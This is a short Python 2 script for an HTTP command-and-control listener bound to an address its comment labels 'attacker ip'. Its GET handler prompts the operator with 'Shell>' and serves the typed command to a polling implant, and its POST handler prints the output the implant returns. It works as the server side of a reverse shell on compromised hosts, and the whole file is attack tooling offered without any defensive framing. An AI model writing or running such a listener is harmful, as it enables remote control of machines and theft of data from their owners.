from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

host_name = '192.168.1.102' ## attacker ip
port_number = 80


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(s):
        command = raw_input('Shell>')
        s.send_response(200)
        s.send_header("Content-type","text/html")
        s.end_headers()
        s.wfile.write(command)
    def do_POST(s):
        s.send_response(200)
        s.end_headers()
        length = int(s.headers['content-length'])
        postVar=s.rfile.read(length)
        print(postVar)


def main():
    server_class = HTTPServer
    httpd = server_class((host_name,port_number),MyHandler)
    try:
        httpd.serve_forever()
	print('server started using '+host_name+":"+port_number)
    except KeyboardInterrupt:
        print('[!] server is terminated')
if __name__=="__main__":
    main()
